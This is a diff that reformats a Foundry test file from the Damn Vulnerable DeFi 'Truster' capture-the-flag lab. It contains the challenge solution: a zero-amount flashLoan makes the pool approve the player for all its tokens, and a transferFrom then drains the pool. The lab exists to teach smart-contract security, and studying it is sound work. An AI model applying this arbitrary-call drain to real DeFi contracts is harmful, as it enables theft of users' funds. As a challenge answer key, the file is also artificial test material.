@@ -2,15 +2,15 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
-import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import { Test, console } from "forge-std/Test.sol";
+import { DamnValuableToken } from "../../src/DamnValuableToken.sol";
+import { TrusterLenderPool } from "../../src/truster/TrusterLenderPool.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -51,7 +51,12 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        pool.flashLoan(0, player, address(token), abi.encodeCall(token.approve, (player, TOKENS_IN_POOL)));
+        pool.flashLoan(
+            0,
+            player,
+            address(token),
+            abi.encodeCall(token.approve, (player, TOKENS_IN_POOL))
+        );
         token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
     }
 
@@ -64,6 +69,10 @@ contract TrusterChallenge is Test {
 
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
     }
 }
